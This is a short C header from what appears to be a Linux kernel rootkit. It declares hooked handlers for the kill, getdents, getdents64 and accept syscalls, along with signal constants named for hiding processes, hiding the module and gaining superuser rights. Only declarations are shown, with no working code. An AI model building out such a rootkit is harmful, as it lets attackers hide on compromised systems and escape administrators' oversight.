#ifndef HOOKS_H
#define HOOKS_H

#include <linux/ptrace.h>

enum {
    SIGINVIS = 31,
    SIGSUPER = 64,
    SIGMODINVIS = 63,
};

asmlinkage long hooked_kill(const struct pt_regs *pt_regs);
asmlinkage long hooked_getdents(const struct pt_regs *pt_regs);
asmlinkage long hooked_getdents64(const struct pt_regs *pt_regs);
asmlinkage long hooked_accept(const struct pt_regs *pt_regs);

#endif /* HOOKS_H */
